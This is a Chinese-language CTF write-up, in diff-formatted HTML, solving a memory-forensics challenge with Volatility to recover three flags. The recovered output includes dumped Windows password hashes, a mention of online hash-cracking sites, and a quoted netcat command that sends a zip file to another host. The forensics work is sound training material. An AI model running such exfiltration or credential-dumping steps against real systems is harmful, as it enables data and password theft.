 <p>正确通过。。。</p>
+<h2 id="bmzctf-内存取证">BMZCTF 内存取证 </h2>
+<pre data-role="codeBlock" data-info="" class="language-text text"><code>[BMZCTF]内存取证三项
+题目描述：一天下午小白出去吃饭，临走之前还不忘锁了电脑，这时同寝室的小黑想搞点事情，懂点黑客和社工知识的小黑经过多次尝试获得了密码成功进入电脑，于是便悄悄在电脑上动起手脚了，便在桌面上写着什么，想给小白一个惊喜，同时还传送着小白的机密文件，正巧这时小白刚好回来，两人都吓了一跳，小黑也不管自己在电脑上留下的操作急忙离开电脑，故作淡定的说：“我就是随便看看”。
+1.小黑写的啥，据说是flag？
+2.那么问题来了，小白的密码是啥？
+3.小黑发送的机密文件里面到底是什么
+</code></pre><p>拿到题目，无论如何，先看imageinfo</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw imageinfo</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>INFO    <span class="token builtin class-name">:</span> volatility.debug    <span class="token builtin class-name">:</span> Determining profile based on KDBG search<span class="token punctuation">..</span>.
+          Suggested Profile<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> WinXPSP2x86, WinXPSP3x86 <span class="token punctuation">(</span>Instantiated with WinXPSP2x86<span class="token punctuation">)</span>
+                     AS Layer1 <span class="token builtin class-name">:</span> IA32PagedMemoryPae <span class="token punctuation">(</span>Kernel AS<span class="token punctuation">)</span>
+                     AS Layer2 <span class="token builtin class-name">:</span> FileAddressSpace <span class="token punctuation">(</span>/home/neko/Desktop/L-12A6C33F43D74-20161114-125252.raw<span class="token punctuation">)</span>
+                      PAE <span class="token builtin class-name">type</span> <span class="token builtin class-name">:</span> PAE
+                           DTB <span class="token builtin class-name">:</span> 0xb18000L
+                          KDBG <span class="token builtin class-name">:</span> 0x80545ce0L
+          Number of Processors <span class="token builtin class-name">:</span> <span class="token number">1</span>
+     Image Type <span class="token punctuation">(</span>Service Pack<span class="token punctuation">)</span> <span class="token builtin class-name">:</span> <span class="token number">2</span>
+                KPCR <span class="token keyword keyword-for">for</span> CPU <span class="token number">0</span> <span class="token builtin class-name">:</span> 0xffdff000L
+             KUSER_SHARED_DATA <span class="token builtin class-name">:</span> 0xffdf0000L
+           Image <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:52:58 UTC+0000
+     Image <span class="token builtin class-name">local</span> <span class="token function">date</span> and <span class="token function">time</span> <span class="token builtin class-name">:</span> <span class="token number">2016</span>-11-14 <span class="token number">20</span>:52:58 +0800
+</code></pre><p>通过Suggested确定我们需要使用的配置文件为WinXPSP2x86</p>
+<p>题目可以看出小黑并没有关闭正在写入的文件，那么我就可以看看palist，看看能找到些什么信息</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 pslist</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+Offset<span class="token punctuation">(</span>V<span class="token punctuation">)</span>  Name                    PID   <span class="token environment constant">PPID</span>   Thds     Hnds   Sess  Wow64 Start                          Exit                          
+---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
+0x80eca020 System                    <span class="token number">4</span>      <span class="token number">0</span>     <span class="token number">59</span>      <span class="token number">252</span> ------      <span class="token number">0</span>                                     
+0x80d98b30 smss.exe                <span class="token number">552</span>      <span class="token number">4</span>      <span class="token number">3</span>       <span class="token number">21</span> ------      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:44 UTC+0000       
+0xff70e918 csrss.exe               <span class="token number">668</span>    <span class="token number">552</span>     <span class="token number">11</span>      <span class="token number">401</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:47 UTC+0000       
+0xff704da0 winlogon.exe            <span class="token number">692</span>    <span class="token number">552</span>     <span class="token number">18</span>      <span class="token number">445</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:48 UTC+0000       
+0xff6eb490 services.exe            <span class="token number">736</span>    <span class="token number">692</span>     <span class="token number">16</span>      <span class="token number">280</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:49 UTC+0000       
+0xff6e7770 lsass.exe               <span class="token number">748</span>    <span class="token number">692</span>     <span class="token number">21</span>      <span class="token number">350</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:49 UTC+0000       
+0xff6d2b48 vmacthlp.exe            <span class="token number">900</span>    <span class="token number">736</span>      <span class="token number">1</span>       <span class="token number">24</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:50 UTC+0000       
+0xff6b12c0 svchost.exe             <span class="token number">928</span>    <span class="token number">736</span>     <span class="token number">17</span>      <span class="token number">193</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:50 UTC+0000   
+0xff69f1a8 svchost.exe             <span class="token number">992</span>    <span class="token number">736</span>     <span class="token number">10</span>      <span class="token number">258</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:51 UTC+0000       
+0xff68d310 svchost.exe            <span class="token number">1152</span>    <span class="token number">736</span>     <span class="token number">64</span>     <span class="token number">1217</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:51 UTC+0000       
+0xff6844c0 svchost.exe            <span class="token number">1220</span>    <span class="token number">736</span>      <span class="token number">6</span>       <span class="token number">59</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:51 UTC+0000       
+0xff6773c8 svchost.exe            <span class="token number">1360</span>    <span class="token number">736</span>     <span class="token number">14</span>      <span class="token number">208</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:52 UTC+0000       
+0xff655498 spoolsv.exe            <span class="token number">1560</span>    <span class="token number">736</span>     <span class="token number">11</span>      <span class="token number">130</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:09:53 UTC+0000       
+0xff63e718 svchost.exe            <span class="token number">1692</span>    <span class="token number">736</span>      <span class="token number">5</span>       <span class="token number">87</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:11 UTC+0000       
+0xff6383d0 VGAuthService.e        <span class="token number">1756</span>    <span class="token number">736</span>      <span class="token number">2</span>       <span class="token number">61</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:11 UTC+0000       
+0xff61b4d8 vmtoolsd.exe           <span class="token number">1932</span>    <span class="token number">736</span>      <span class="token number">8</span>      <span class="token number">251</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:20 UTC+0000       
+0xff5ea6b0 alg.exe                 <span class="token number">308</span>    <span class="token number">736</span>      <span class="token number">6</span>      <span class="token number">105</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:22 UTC+0000       
+0xff5e89b0 wmiprvse.exe            <span class="token number">316</span>    <span class="token number">928</span>     <span class="token number">12</span>      <span class="token number">233</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:22 UTC+0000       
+0xff5b8a48 explorer.exe           <span class="token number">1416</span>   <span class="token number">1332</span>     <span class="token number">15</span>      <span class="token number">446</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:26 UTC+0000       
+0xff583a18 wscntfy.exe            <span class="token number">1204</span>   <span class="token number">1152</span>      <span class="token number">1</span>       <span class="token number">44</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:26 UTC+0000       
+0xff56b1b0 rundll32.exe           <span class="token number">1744</span>   <span class="token number">1416</span>      <span class="token number">4</span>       <span class="token number">78</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:28 UTC+0000       
+0xff56a3f8 vmtoolsd.exe           <span class="token number">1704</span>   <span class="token number">1416</span>      <span class="token number">6</span>      <span class="token number">170</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:28 UTC+0000       
+0xff566da0 ctfmon.exe             <span class="token number">1912</span>   <span class="token number">1416</span>      <span class="token number">1</span>       <span class="token number">89</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:10:28 UTC+0000       
+0x80d4bb28 wpabaln.exe            <span class="token number">1992</span>    <span class="token number">692</span>      <span class="token number">1</span>       <span class="token number">66</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:12:26 UTC+0000       
+0xff5ee020 notepad.exe             <span class="token number">280</span>   <span class="token number">1416</span>      <span class="token number">1</span>       <span class="token number">50</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:20:27 UTC+0000       
+0xff5c5020 cmd.exe                <span class="token number">1568</span>   <span class="token number">1416</span>      <span class="token number">1</span>       <span class="token number">34</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:23:34 UTC+0000       
+0xff5b6448 conime.exe              <span class="token number">860</span>   <span class="token number">1568</span>      <span class="token number">1</span>       <span class="token number">36</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:23:34 UTC+0000       
+0x80d4d7f0 wmiprvse.exe            <span class="token number">856</span>    <span class="token number">928</span>      <span class="token number">6</span>      <span class="token number">135</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:48:39 UTC+0000       
+0xff555020 nc.exe                  <span class="token number">120</span>   <span class="token number">1568</span>      <span class="token number">1</span>       <span class="token number">34</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:50:28 UTC+0000       
+0xff65c2a0 DumpIt.exe              <span class="token number">392</span>   <span class="token number">1416</span>      <span class="token number">1</span>       <span class="token number">24</span>      <span class="token number">0</span>      <span class="token number">0</span> <span class="token number">2016</span>-11-14 <span class="token number">12</span>:52:52 UTC+0000       
+</code></pre><p>我们可以看到三个值得注意的文件，nc.exe，cmd.exe，notepad.exe，前两个我们先不管，我们先看看notepad都写了些什么</p>
+<p>这里可以使用notepad模块</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 notepad</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+Process: <span class="token number">280</span>
+Text:
+?
+Text:
+d
+Text:
+
+Text:
+?
+Text:
+666C61677B57336C6563306D655F376F5F466F72336E356963737D
+</code></pre><p>前面都不重要，我们看最底下他返回了一个字符串，按照形式看应该是ascii编码的</p>
+<p>解码我们可以使用python的binascii模块，他具有ascii与文本的转换功能</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ python 
+Python <span class="token number">3.11</span>.6 <span class="token punctuation">(</span>main, Nov <span class="token number">14</span> <span class="token number">2023</span>, 09:36:21<span class="token punctuation">)</span> <span class="token punctuation">[</span>GCC <span class="token number">13.2</span>.1 <span class="token number">20230801</span><span class="token punctuation">]</span> on linux
+Type <span class="token string">"help"</span>, <span class="token string">"copyright"</span>, <span class="token string">"credits"</span> or <span class="token string">"license"</span> <span class="token keyword keyword-for">for</span> <span class="token function">more</span> information.
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> from binascii <span class="token function">import</span> *
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> a2b_hex<span class="token punctuation">(</span><span class="token string">"666C61677B57336C6563306D655F376F5F466F72336E356963737D"</span><span class="token punctuation">)</span>
+b<span class="token string">'flag{W3lec0me_7o_For3n5ics}'</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> 
+</code></pre><p>flag{W3lec0me_7o_For3n5ics}</p>
+<p>flag1 get</p>
+<p>第二题是要我们查询用户密码，一般而言直接使用mimikatz就可以查询到密码</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 mimikatz</code></p>
+<p>但是不清楚是不是题目设计者的计算mimikatz似乎无法在xp上获取信息，所以我们可以再尝试hashdump来获得hash在到互联网上查询</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 hashdump</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+Administrator:500:1e27e87bd14ec8af43714428b303e3e4:1e581aafa474dfadfdf83fc31e4fd4ea:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:687255e91a0f559b6d75553dbd51f785:b6125736bdd2d5f154fdce59f52e39f1:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:fb41f8d1334fba131974c39bfab09512:::
+</code></pre><p>可以找到hash为：1e581aafa474dfadfdf83fc31e4fd4ea</p>
+<p>两个网站：<a href="https://www.cmd5.com/login.aspx">https://www.cmd5.com/login.aspx</a> <a href="https://crackstation.net/">https://crackstation.net/</a></p>
+<p>crackstation什么都没查出来cmd5倒是查出来了</p>
+<p><img src="https://picdl.sunbangyan.cn/2023/11/26/03ff22def1abae3f71f2bff1bffe9e66.jpeg" alt=""></p>
+<p>我是真不想花冤枉钱。。。。就当我查出来了罢</p>
+<p>密码：flag{19950101}</p>
+<p>flag2 get</p>
+<p>来到第三题，他问我们小黑传输了什么文件，还记得我们通过pslist查询到的cmd.exe和nc.exe吗，这里的思路就很明显了，通过cmdscan来看看小黑都执行了什么命令</p>
+<p><code>vol.py -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 cmdscan</code></p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code>Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+**************************************************
+CommandProcess: csrss.exe Pid: <span class="token number">668</span>
+CommandHistory: 0x2da3850 Application: cmd.exe Flags: Allocated, Reset
+CommandCount: <span class="token number">3</span> LastAdded: <span class="token number">2</span> LastDisplayed: <span class="token number">2</span>
+FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>
+ProcessHandle: 0x3dc
+Cmd <span class="token comment">#0 @ 0x56af00: ipconfig</span>
+Cmd <span class="token comment">#1 @ 0x56d650: cd C:\Program Files\Netcat</span>
+Cmd <span class="token comment">#2 @ 0x2da2e40: nc 192.168.57.14 2333 &lt; P@ssW0rd_is_y0ur_bir7hd4y.zip</span>
+**************************************************
+CommandProcess: csrss.exe Pid: <span class="token number">668</span>
+CommandHistory: 0x2dae628 Application: nc.exe Flags: Allocated
+CommandCount: <span class="token number">0</span> LastAdded: <span class="token parameter variable">-1</span> LastDisplayed: <span class="token parameter variable">-1</span>
+FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>
+ProcessHandle: 0x1f0
+Cmd <span class="token comment">#20 @ 0x180018: .4148</span>
+**************************************************
+CommandProcess: csrss.exe Pid: <span class="token number">668</span>
+CommandHistory: 0x2ddea58 Application: DumpIt.exe Flags: Allocated
+CommandCount: <span class="token number">0</span> LastAdded: <span class="token parameter variable">-1</span> LastDisplayed: <span class="token parameter variable">-1</span>
+FirstCommand: <span class="token number">0</span> CommandCountMax: <span class="token number">50</span>
+ProcessHandle: 0x164
+</code></pre><p>这里的命令可以看出小黑通过nc命令将名为P@ssW0rd_is_y0ur_bir7hd4y.zip的压缩包文件传输到了一个内网的机器上，那我们的目标就是找到这个文件，可以通过filescan加上grep命令过滤文件名找到文件在通过dumpfile将文件dump出来</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ vol.py <span class="token parameter variable">-f</span> L-12A6C33F43D74-20161114-125252.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 filescan <span class="token operator">|</span> <span class="token function">grep</span> P@ssW0rd_is_y0ur_bir7hd4y.zip
+Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+0x0000000002c61318      <span class="token number">3</span>      <span class="token number">1</span> R--rw- <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Netcat<span class="token punctuation">\</span>P@ssW0rd_is_y0ur_bir7hd4y.zip
+<span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ vol.py <span class="token parameter variable">-f</span> L-12A6C33F43D74-20161114-125252.raw <span class="token parameter variable">--profile</span><span class="token operator">=</span>WinXPSP2x86 dumpfiles <span class="token parameter variable">-Q</span> 0x0000000002c61318 <span class="token parameter variable">-D</span> ./
+Volatility Foundation Volatility Framework <span class="token number">2.6</span>
+DataSectionObject 0x02c61318   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Netcat<span class="token punctuation">\</span>P@ssW0rd_is_y0ur_bir7hd4y.zip
+SharedCacheMap 0x02c61318   None   <span class="token punctuation">\</span>Device<span class="token punctuation">\</span>HarddiskVolume1<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Netcat<span class="token punctuation">\</span>P@ssW0rd_is_y0ur_bir7hd4y.zip
+</code></pre><p>尝试解压时提示我们需要密码</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ <span class="token function">unzip</span> file.None.0xff6d3410.dat 
+Archive:  file.None.0xff6d3410.dat
+<span class="token punctuation">[</span>file.None.0xff6d3410.dat<span class="token punctuation">]</span> P@ssW0rd_is_y0ur_bir7hd4y.txt password:
+</code></pre><p>之前获取到了小白电脑的密码为flag{19950101}，尝试取中间的出生年月日为密码</p>
+<pre data-role="codeBlock" data-info="shell" class="language-shell shell"><code><span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ <span class="token function">unzip</span> file.None.0xff6d3410.dat 
+Archive:  file.None.0xff6d3410.dat
+<span class="token punctuation">[</span>file.None.0xff6d3410.dat<span class="token punctuation">]</span> P@ssW0rd_is_y0ur_bir7hd4y.txt password: 
+ extracting: P@ssW0rd_is_y0ur_bir7hd4y.txt 
+<span class="token punctuation">[</span>neko@NekoArch Desktop<span class="token punctuation">]</span>$ <span class="token function">cat</span> P<span class="token punctuation">\</span>@ssW0rd_is_y0ur_bir7hd4y.txt 
+flag<span class="token punctuation">{</span>Thi5_Is_s3cr3t<span class="token operator">!</span><span class="token punctuation">}</span>
+</code></pre><p>flag{Thi5_Is_s3cr3t!}</p>
+<p>flag3 get</p>
+<p>题解。</p>
+
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
